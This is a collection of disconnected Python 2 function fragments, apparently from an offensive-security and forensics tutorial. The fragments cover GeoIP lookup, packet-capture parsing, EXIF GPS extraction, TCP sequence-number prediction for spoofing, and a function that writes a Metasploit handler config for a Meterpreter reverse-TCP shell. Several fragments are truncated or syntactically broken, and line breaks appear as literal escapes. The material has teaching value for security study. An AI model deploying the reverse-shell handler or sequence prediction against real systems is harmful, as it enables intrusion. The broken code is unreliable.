def retGeoStr(ip): \n     try: \n         rec = gi.record_by_name(ip) \n         city = rec['city'] \n         country = rec['country_code3'] \n         if city != '': \n             geoLoc = city + ', ' + country \n         else: \n             geoLoc = country \n         return geoLoc \n     except Exception, e: \n         return 'Unregistered' \n
def testUserAgent(url, userAgent): \n     browser = mechanize.Browser() \n     browser.addheaders = userAgent \n     page = browser.open(url) \n     source_code = page.read() \n
def retKML(ip): \n     rec = gi.record_by_name(ip) \n     try: \n         longitude = rec['longitude'] \n         latitude = rec['latitude'] \n         kml = (               '<Placemark>\n', '<name>%s</name>\n',  '<Point>\n', '<coordinates>%6f, %6f</coordinates>\n',           '</Point>\n','</Placemark>\n') \n         return kml \n     except: \n         return ' \n
def printPcap(pcap): \n     for (ts, buf) in pcap: \n         try: \n             eth = dpkt.ethernet.Ethernet(buf) \n             ip = eth.data \n             src = socket.inet_ntoa(ip.src) \n             dst = socket.inet_ntoa(ip.dst) \n         except: \n             pass \n
def testForExif(imgFileName): \n     try: \n         exifData = {} \n         imgFile = Image.open(imgFileName) \n         info = imgFile._getexif() \n         if info: \n             for (tag, value) in info.items(): \n                 decoded = TAGS.get(tag, tag) \n                 exifData[decoded] = value \n             exifGPS = exifData['GPSInfo'] \n     except: \n         pass \n
def calTSN(tgt): \n     seqNum = 0 \n     preNum = 0 \n     diffSeq = 0 \n  \n     for x in range(1, 5): \n         if preNum != 0: \n             preNum = seqNum \n         pkt = IP(dst=tgt) / TCP() \n         ans = sr1(pkt, verbose=0) \n         seqNum = ans.getlayer(TCP).seq \n         diffSeq = seqNum - preNum \n     return seqNum + diffSeq \n
def setupHandler(configFile, lhost, lport): \n     configFile.write('use exploit/multi/handler\n') \n     configFile.write('set payload '+\ \n       'windows/meterpreter/reverse_tcp\n') \n     configFile.write('set LPORT ' + str(lport) + '\n') \n     configFile.write('set LHOST ' + lhost + '\n') \n     configFile.write('exploit -j -z\n') \n     configFile.write('setg DisablePayloadHandler 1\n') \n
def testTTL(pkt): \n     try: \n         if pkt.haslayer(IP): \n             ipsrc = pkt.getlayer(IP).src \n             ttl = str(pkt.ttl) \n             checkTTL(ipsrc, ttl) \n     except: \n         pass \n
def __init__(self, host, user, password): \n         self.host = host \n         self.user = user \n         self.password = password \n         self.session = self.connect() \n
def printDownloads(downloadDB): \n     conn = sqlite3.connect(downloadDB) \n     c = conn.cursor() \n     c.execute('SELECT name, source, datetime(endTime/1000000,\'unixepoch\') FROM moz_downloads;' \n
